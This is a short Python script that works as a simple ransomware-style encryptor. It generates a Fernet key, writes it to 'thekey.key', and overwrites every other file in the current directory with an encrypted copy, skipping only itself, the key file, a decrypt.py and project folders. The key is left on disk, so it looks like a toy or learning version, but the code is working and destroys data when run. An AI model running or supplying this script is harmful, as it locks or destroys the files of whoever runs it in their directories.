import os
from cryptography.fernet import Fernet

global data  # data to be encrypted
files = []

key = Fernet.generate_key()

for file in os.listdir():
    if file == 'thekey.key' or file == 'script.py' or file == '.idea' or file == 'decrypt.py' or file == '.git':
        continue

    files.append(file)
print(files)
# print(key)
with open('thekey.key', 'wb') as key_file:
    key_file.write(key)

# Creating a Fernet object with the generated key
cipher = Fernet(key)

for file in files:
    with open(file, 'rb') as f:
        data = f.read()

    encrypted = cipher.encrypt(data)  # Using the Fernet object to encrypt

    with open(file, 'wb') as f:
        f.write(encrypted)

print("Encryption done")
